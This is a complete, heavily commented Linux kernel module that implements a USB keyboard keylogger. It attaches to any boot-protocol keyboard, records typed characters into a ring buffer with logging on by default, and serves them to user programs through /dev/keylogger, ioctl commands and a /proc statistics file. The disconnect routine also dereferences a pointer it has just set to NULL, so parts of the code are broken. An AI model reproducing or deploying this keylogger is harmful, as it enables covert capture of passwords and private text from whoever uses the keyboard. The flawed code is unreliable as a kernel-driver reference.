#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/usb.h>
#include <linux/cdev.h>
#include <linux/device.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/spinlock.h>
#include <linux/wait.h>
#include <linux/slab.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/mutex.h>

/* 

/dev is a special folder with files for devices.

DEVICE_NAME: name of the file in /dev, e.g. /dev/keylogger. Programs open this file to talk to the keylogger.

DRIVER_NAME: the driver's own name *inside the kernel*.
It is NOT a file, just a label for this driver for when the kernel prints messages or refers to that driver.

PROC_NAME: name of a stats file in /proc, e.g. /proc/keylogger_stats.

*/
#define DEVICE_NAME "keylogger"
#define DRIVER_NAME "keylogger"
#define PROC_NAME   "keylogger_stats"

#define BUF_SIZE 1024

/*

IOCTLs (Input/Output ConTroL) are special commands that a user program can
send to the driver, in addition to normal read/write. They are used to ask
the driver to do control actions like "enable", "disable", "clear buffer",
or "reset stats".

KEYLOGGER_IOC_MAGIC is a small ID (here the character 'k') that marks all
IOCTL commands belonging to this keylogger driver. It helps keep the IOCTL
numbers for this driver grouped and unique.

Each of the following defines IOCTL command codes using the macro
_IO(magic, number). The 'magic' is KEYLOGGER_IOC_MAGIC ('k') and the number
is a small command ID (0, 1, 2, 3). A user-space program calls ioctl(fd, ...)
with these codes to control the keylogger:

KEYLOGGER_IOC_RESET_STATS: command 0, tells the driver to reset its
    internal statistics.

KEYLOGGER_IOC_CLEAR_BUFFER: command 1, tells the driver to clear the
    internal buffer where logged keystrokes are stored.

KEYLOGGER_IOC_ENABLE: command 2, tells the driver to start keylogging.

KEYLOGGER_IOC_DISABLE: command 3, tells the driver to stop keylogging.

Typical user-space usage looks like this (simplified):
    int fd = open("/dev/keylogger", O_RDWR);
    ioctl(fd, KEYLOGGER_IOC_ENABLE);        
    ioctl(fd, KEYLOGGER_IOC_RESET_STATS);   
    ioctl(fd, KEYLOGGER_IOC_CLEAR_BUFFER);  
    ioctl(fd, KEYLOGGER_IOC_DISABLE);

*/
#define KEYLOGGER_IOC_MAGIC 'k'
#define KEYLOGGER_IOC_RESET_STATS   _IO(KEYLOGGER_IOC_MAGIC, 0)
#define KEYLOGGER_IOC_CLEAR_BUFFER  _IO(KEYLOGGER_IOC_MAGIC, 1)
#define KEYLOGGER_IOC_ENABLE        _IO(KEYLOGGER_IOC_MAGIC, 2)
#define KEYLOGGER_IOC_DISABLE       _IO(KEYLOGGER_IOC_MAGIC, 3)

/*
usage: an unsigned 8-bit HID key code.

    0x04–0x1d: A–Z → return 'a'..'z'
    0x1e–0x26: 1–9 → return '1'..'9'
    0x27: 0   → return '0'
    0x2c: space  → return ' '
    0x28: Enter  → return '\n'

Hex (0x..) is used because the HID tables are given in hex, so these
values match the spec directly. Any other code returns 0 (unsupported).
*/

static char simple_usage_to_ascii(u8 usage)
{
    if (usage >= 0x04 && usage <= 0x1d) return 'a' + (usage - 0x04);

    else if (usage >= 0x1e && usage <= 0x26) return '1' + (usage - 0x1e);
    
    else if (usage == 0x27) return '0';

    else if (usage == 0x2c) return ' ';

    else if (usage == 0x28) return '\n';

    return 0; 
}

/*
struct keylogger_dev:
This structure stores everything the keylogger driver needs for one device.

    devno:        The device number that links the driver to /dev/keylogger.

    cdev:         The struct that connects file operations
                    (open, read, write, ioctl, etc.) to this device.

    cls:          The device class used to create the /dev node (e.g. /dev/keylogger).

    device:       The kernel device object that represents this keylogger.

    buf:          Pointer to a memory buffer where captured keystrokes are stored.
                    This is implemented as a circular buffer.

    buf_size:     Size of that buffer in bytes.

    head:         Index in the buffer where the next character will be written.

    tail:         Index in the buffer where the next character will be read.

    full:         True if the ring buffer is full.

    lock:         Spinlock that protects access to the buffer and counters.

    read_q:       Wait queue for reader processes; readers can sleep here until
                    new keystrokes becomes available.

    write_q:      Wait queue for writers/producers; can be used if code wants
                    to wait for space in the buffer.

    keys_captured: Total number of key events captured by the keylogger so far.

    bytes_read:    Total number of bytes user space has read from this device.

    overflows:     Number of times data was lost because the buffer was full
                    and new keys could not be stored.

    opens:         Number of times user-space programs opened this device file. 

    usbdev:       Pointer to the USB device representing the keyboard that this
                    keylogger is attached to.

    irq_urb:      USB Request Block used for the interrupt transfer that delivers
                    key events from the keyboard to the driver.

    irq_buf:      Memory buffer where incoming USB interrupt data are placed by the USB controller.

    irq_dma:      DMA address corresponding to irq_buf, used so the USB hardware
                    can write directly into memory.

    irq_interval: How often the USB interrupt transfer is scheduled.

    irq_pipe:     The USB pipe used for the interrupt transfer that carries the keyboard reports.
*/
struct keylogger_dev 
{
    dev_t devno;
    struct cdev cdev;
    struct class *cls;
    struct device *device;

    char *buf;
    size_t buf_size;
    size_t head;   
    size_t tail;  
    bool   full;

    spinlock_t lock;
    wait_queue_head_t read_q;
    wait_queue_head_t write_q;

    u64 keys_captured;
    u64 bytes_read;
    u64 overflows;
    u64 opens;

    bool logging_enabled;

    struct usb_device *usbdev;
    struct urb *irq_urb;
    unsigned char *irq_buf;
    dma_addr_t irq_dma;
    int irq_interval;
    int irq_pipe;
};

static struct keylogger_dev *g_dev; // a pointer to a keylogger_dev struct on line 157
static struct proc_dir_entry *proc_entry; // a pointer to a procfs entry (a /proc/... file).

/*
These two small helper functions check the state of the keylogger's ring buffer.

    buffer_is_empty(dev):
        Returns true when the buffer has no data to read.
        It checks:
            dev->full is false (so we are not in the "full" state), AND
            dev->head == dev->tail (write and read positions are the same).

    buffer_is_full(dev):
        Returns true when the buffer is completely full.
*/
static bool buffer_is_empty(struct keylogger_dev *dev)
{
    return (!dev->full && (dev->head == dev->tail));
}

static bool buffer_is_full(struct keylogger_dev *dev)
{
    return dev->full;
}

static size_t buffer_space_available(struct keylogger_dev *dev)
{
    if (dev->full) return 0;

    if (dev->head >= dev->tail) return dev->buf_size - (dev->head - dev->tail);

    else return dev->tail - dev->head;
}

/*
buffer_put_char:
Store one character 'ch' into the keylogger's ring buffer.

    dev->buf[dev->head] = ch;
        Put the new character at the current write position 'head'.

    dev->head = (dev->head + 1) % dev->buf_size;
        Move 'head' forward by 1, and wrap around to 0 when it reaches
        the end of the buffer (this is what makes it a circular buffer).

    if (dev->head == dev->tail)
        dev->full = true;
    
After moving 'head', if it now equals 'tail', it means we have
filled all available slots, so mark the buffer as full.
*/
static void buffer_put_char(struct keylogger_dev *dev, char ch)
{
    dev->buf[dev->head] = ch;

    dev->head = (dev->head + 1) % dev->buf_size;

    if (dev->head == dev->tail) dev->full = true;
}

/*
buffer_get:
Copy characters out of the keylogger's ring buffer into 'dst'.

    'dst' : pointer to user buffer where we will copy characters.
    'max' : maximum number of characters we are allowed to copy.
    Returns: how many characters were actually copied.

    Steps:
    Start with 'copied = 0' (nothing copied yet).

    While:
    - the buffer is NOT empty, and
    - we have not yet copied 'max' characters,
        
        Take one character from the buffer at position 'tail'
            and store it into dst[copied].

        Increase 'copied' by 1.
        
        Move 'tail' forward by 1 (and wrap around with % buf_size
            so the index stays inside the ring buffer).
        
        Set 'full' to false because reading always frees space,
            so the buffer cannot be "full" after removing data.

        When the loop ends, return 'copied' to say how many
            characters were taken from the buffer.
*/
static size_t buffer_get(struct keylogger_dev *dev, char *dst, size_t max)
{
    size_t copied = 0;

    while (!buffer_is_empty(dev) && copied < max) 
    {
        dst[copied++] = dev->buf[dev->tail];
        dev->tail = (dev->tail + 1) % dev->buf_size;
        dev->full = false;
    }
    return copied;
}

/*
This function runs every time the keyboard sends data to the computer.
First it gets our driver’s state (dev) from urb->context, which is just
a pointer we stored there earlier so we can find our own data again.
If the transfer had a problem (urb->status is not 0), it skips all work
and simply asks the system to call us again next time (resubmits the URB).
If everything is OK, it locks our data so nothing else can change it
while we are working. Then, if logging is turned on, it looks at the
bytes in the keyboard message that list which keys are currently pressed,
ignoring empty entries. For each pressed key, it tries to turn the raw
code into a normal character like 'a' or '1'; if that works and there is
room, it saves the character in a buffer and counts it, otherwise it just
counts that something was dropped. If there is now at least one saved
character, it wakes up any program that is waiting to read keystrokes.
Finally, it unlocks the data and always resubmits the request so the
next keyboard message will also come to this function.
 */
static void keylogger_irq(struct urb *urb)
{
    struct keylogger_dev *dev = urb->context;
    unsigned long flags;
    int i;
    u8 *data = dev->irq_buf;

    if (urb->status) goto resubmit;


    spin_lock_irqsave(&dev->lock, flags);

    if (dev->logging_enabled) 
    {
        for (i = 2; i < 8; i++) 
        {
            u8 usage = data[i];
            char ch;

            if (!usage) continue;

            ch = simple_usage_to_ascii(usage);
            if (!ch) continue;

            if (buffer_is_full(dev)) 
            {
                dev->overflows++;
                continue;
            }
            buffer_put_char(dev, ch);
            dev->keys_captured++;
        }

        if (!buffer_is_empty(dev)) wake_up_interruptible(&dev->read_q);
    }

    spin_unlock_irqrestore(&dev->lock, flags);

    resubmit:
        usb_submit_urb(urb, GFP_ATOMIC);
}

/* ==== USB probe/disconnect ==== */

static int keylogger_probe(struct usb_interface *intf,
                           const struct usb_device_id *id)
{
    struct usb_device *udev = interface_to_usbdev(intf);
    struct usb_host_interface *iface_desc;
    struct usb_endpoint_descriptor *endpoint;
    int pipe, maxp;
    int error;

    if (!g_dev)
        return -ENODEV;

    iface_desc = intf->cur_altsetting;
    if (iface_desc->desc.bNumEndpoints < 1)
        return -ENODEV;

    endpoint = &iface_desc->endpoint[0].desc;
    if (!usb_endpoint_is_int_in(endpoint))
        return -ENODEV;

    pipe = usb_rcvintpipe(udev, endpoint->bEndpointAddress);
    maxp = usb_maxpacket(udev, pipe, usb_pipeout(pipe));

    g_dev->usbdev = udev;
    g_dev->irq_interval = endpoint->bInterval;
    g_dev->irq_pipe = pipe;

    g_dev->irq_buf = usb_alloc_coherent(udev, maxp, GFP_ATOMIC,
                                        &g_dev->irq_dma);
    if (!g_dev->irq_buf)
        return -ENOMEM;

    g_dev->irq_urb = usb_alloc_urb(0, GFP_KERNEL);
    if (!g_dev->irq_urb) {
        usb_free_coherent(udev, maxp, g_dev->irq_buf, g_dev->irq_dma);
        g_dev->irq_buf = NULL;
        return -ENOMEM;
    }

    usb_fill_int_urb(g_dev->irq_urb, udev, pipe,
                     g_dev->irq_buf, maxp, keylogger_irq,
                     g_dev, g_dev->irq_interval);
    g_dev->irq_urb->transfer_dma = g_dev->irq_dma;
    g_dev->irq_urb->transfer_flags |= URB_NO_TRANSFER_DMA_MAP;

    error = usb_submit_urb(g_dev->irq_urb, GFP_KERNEL);
    if (error) {
        usb_free_urb(g_dev->irq_urb);
        g_dev->irq_urb = NULL;
        usb_free_coherent(udev, maxp, g_dev->irq_buf, g_dev->irq_dma);
        g_dev->irq_buf = NULL;
        return error;
    }

    dev_info(&intf->dev, "keylogger attached\n");
    return 0;
}

static void keylogger_disconnect(struct usb_interface *intf)
{
    struct usb_device *udev = interface_to_usbdev(intf);

    if (!g_dev || g_dev->usbdev != udev)
        return;

    if (g_dev->irq_urb) {
        usb_kill_urb(g_dev->irq_urb);
        usb_free_urb(g_dev->irq_urb);
        g_dev->irq_urb = NULL;
    }
    if (g_dev->irq_buf) {
        usb_free_coherent(udev, g_dev->irq_urb->transfer_buffer_length,
                          g_dev->irq_buf, g_dev->irq_dma);
        g_dev->irq_buf = NULL;
    }
    g_dev->usbdev = NULL;
}

static const struct usb_device_id keylogger_table[] = {
    { USB_INTERFACE_INFO(USB_INTERFACE_CLASS_HID,
                         USB_INTERFACE_SUBCLASS_BOOT,
                         USB_INTERFACE_PROTOCOL_KEYBOARD) },
    { } /* terminating entry */
};
MODULE_DEVICE_TABLE(usb, keylogger_table);

static struct usb_driver keylogger_usb_driver = {
    .name       = DRIVER_NAME,
    .probe      = keylogger_probe,
    .disconnect = keylogger_disconnect,
    .id_table   = keylogger_table,
};

/* ==== Char device operations ==== */

static int keylogger_open(struct inode *inode, struct file *filp)
{
    struct keylogger_dev *dev = container_of(inode->i_cdev,
                                             struct keylogger_dev, cdev);
    filp->private_data = dev;
    dev->opens++;
    return 0;
}

static int keylogger_release(struct inode *inode, struct file *filp)
{
    return 0;
}

static ssize_t keylogger_read(struct file *filp, char __user *buf,
                              size_t count, loff_t *ppos)
{
    struct keylogger_dev *dev = filp->private_data;
    int ret;
    unsigned long flags;
    char *kbuf;
    size_t copied;

    if (count == 0)
        return 0;

    /* Wait for data */
    if (buffer_is_empty(dev)) {
        if (filp->f_flags & O_NONBLOCK)
            return -EAGAIN;

        ret = wait_event_interruptible(dev->read_q,
                                       !buffer_is_empty(dev));
        if (ret)
            return ret;
    }

    kbuf = kmalloc(count, GFP_KERNEL);
    if (!kbuf)
        return -ENOMEM;

    spin_lock_irqsave(&dev->lock, flags);
    copied = buffer_get(dev, kbuf, count);
    dev->bytes_read += copied;
    spin_unlock_irqrestore(&dev->lock, flags);

    if (copy_to_user(buf, kbuf, copied)) {
        kfree(kbuf);
        return -EFAULT;
    }
    kfree(kbuf);

    wake_up_interruptible(&dev->write_q);

    return copied;
}

static ssize_t keylogger_write(struct file *filp, const char __user *buf,
                               size_t count, loff_t *ppos)
{
    struct keylogger_dev *dev = filp->private_data;
    char kbuf[64];
    unsigned long flags;

    if (count > sizeof(kbuf) - 1)
        count = sizeof(kbuf) - 1;

    if (copy_from_user(kbuf, buf, count))
        return -EFAULT;
    kbuf[count] = '\0';

    if (!strncmp(kbuf, "clear", 5)) {
        spin_lock_irqsave(&dev->lock, flags);
        dev->head = dev->tail = 0;
        dev->full = false;
        spin_unlock_irqrestore(&dev->lock, flags);
        wake_up_interruptible(&dev->write_q);
        return count;
    } else if (!strncmp(kbuf, "enable", 6)) {
        dev->logging_enabled = true;
        return count;
    } else if (!strncmp(kbuf, "disable", 7)) {
        dev->logging_enabled = false;
        return count;
    }

    /* Optional: treat write data as fake keystrokes; here we ignore */
    return count;
}

static long keylogger_ioctl(struct file *filp,
                            unsigned int cmd, unsigned long arg)
{
    struct keylogger_dev *dev = filp->private_data;
    unsigned long flags;

    switch (cmd) {
    case KEYLOGGER_IOC_RESET_STATS:
        spin_lock_irqsave(&dev->lock, flags);
        dev->keys_captured = 0;
        dev->bytes_read = 0;
        dev->overflows = 0;
        dev->opens = 0;
        spin_unlock_irqrestore(&dev->lock, flags);
        break;
    case KEYLOGGER_IOC_CLEAR_BUFFER:
        spin_lock_irqsave(&dev->lock, flags);
        dev->head = dev->tail = 0;
        dev->full = false;
        spin_unlock_irqrestore(&dev->lock, flags);
        wake_up_interruptible(&dev->write_q);
        break;
    case KEYLOGGER_IOC_ENABLE:
        dev->logging_enabled = true;
        break;
    case KEYLOGGER_IOC_DISABLE:
        dev->logging_enabled = false;
        break;
    default:
        return -ENOTTY;
    }
    return 0;
}

static const struct file_operations keylogger_fops = {
    .owner          = THIS_MODULE,
    .open           = keylogger_open,
    .release        = keylogger_release,
    .read           = keylogger_read,
    .write          = keylogger_write,
    .unlocked_ioctl = keylogger_ioctl,
};

/* ==== /proc support ==== */

static int keylogger_proc_show(struct seq_file *m, void *v)
{
    struct keylogger_dev *dev = g_dev;

    if (!dev)
        return 0;

    seq_printf(m, "keys_captured: %llu\n", dev->keys_captured);
    seq_printf(m, "bytes_read:    %llu\n", dev->bytes_read);
    seq_printf(m, "buffer_size:   %zu\n", dev->buf_size);
    seq_printf(m, "overflows:     %llu\n", dev->overflows);
    seq_printf(m, "opens:         %llu\n", dev->opens);

    return 0;
}

static int keylogger_proc_open(struct inode *inode, struct file *file)
{
    return single_open(file, keylogger_proc_show, NULL);
}

static const struct file_operations keylogger_proc_fops = {
    .owner   = THIS_MODULE,
    .open    = keylogger_proc_open,
    .read    = seq_read,
    .llseek  = seq_lseek,
    .release = single_release,
};

/* ==== Module init/exit ==== */

static int __init keylogger_init(void)
{
    int ret;

    g_dev = kzalloc(sizeof(*g_dev), GFP_KERNEL);
    if (!g_dev)
        return -ENOMEM;

    g_dev->buf_size = BUF_SIZE;
    g_dev->buf = kmalloc(g_dev->buf_size, GFP_KERNEL);
    if (!g_dev->buf) {
        kfree(g_dev);
        g_dev = NULL;
        return -ENOMEM;
    }

    spin_lock_init(&g_dev->lock);
    init_waitqueue_head(&g_dev->read_q);
    init_waitqueue_head(&g_dev->write_q);
    g_dev->logging_enabled = true;

    /* Char device registration */
    ret = alloc_chrdev_region(&g_dev->devno, 0, 1, DRIVER_NAME);
    if (ret < 0)
        goto err_buf;

    cdev_init(&g_dev->cdev, &keylogger_fops);
    g_dev->cdev.owner = THIS_MODULE;
    ret = cdev_add(&g_dev->cdev, g_dev->devno, 1);
    if (ret < 0)
        goto err_chrdev;

    g_dev->cls = class_create(THIS_MODULE, DRIVER_NAME);
    if (IS_ERR(g_dev->cls)) {
        ret = PTR_ERR(g_dev->cls);
        goto err_cdev;
    }

    g_dev->device = device_create(g_dev->cls, NULL, g_dev->devno,
                                  NULL, DEVICE_NAME);
    if (IS_ERR(g_dev->device)) {
        ret = PTR_ERR(g_dev->device);
        goto err_class;
    }

    /* /proc entry */
    proc_entry = proc_create(PROC_NAME, 0444, NULL, &keylogger_proc_fops);
    if (!proc_entry) {
        ret = -ENOMEM;
        goto err_device;
    }

    /* USB driver registration */
    ret = usb_register(&keylogger_usb_driver);
    if (ret) {
        goto err_proc;
    }

    pr_info("keylogger: module loaded\n");
    return 0;

err_proc:
    remove_proc_entry(PROC_NAME, NULL);
err_device:
    device_destroy(g_dev->cls, g_dev->devno);
err_class:
    class_destroy(g_dev->cls);
err_cdev:
    cdev_del(&g_dev->cdev);
err_chrdev:
    unregister_chrdev_region(g_dev->devno, 1);
err_buf:
    kfree(g_dev->buf);
    kfree(g_dev);
    g_dev = NULL;
    return ret;
}

static void __exit keylogger_exit(void)
{
    if (!g_dev)
        return;

    usb_deregister(&keylogger_usb_driver);

    remove_proc_entry(PROC_NAME, NULL);
    device_destroy(g_dev->cls, g_dev->devno);
    class_destroy(g_dev->cls);
    cdev_del(&g_dev->cdev);
    unregister_chrdev_region(g_dev->devno, 1);

    kfree(g_dev->buf);
    kfree(g_dev);
    g_dev = NULL;

    pr_info("keylogger: module unloaded\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Your Name");
MODULE_DESCRIPTION("USB keyboard keylogger char device driver");
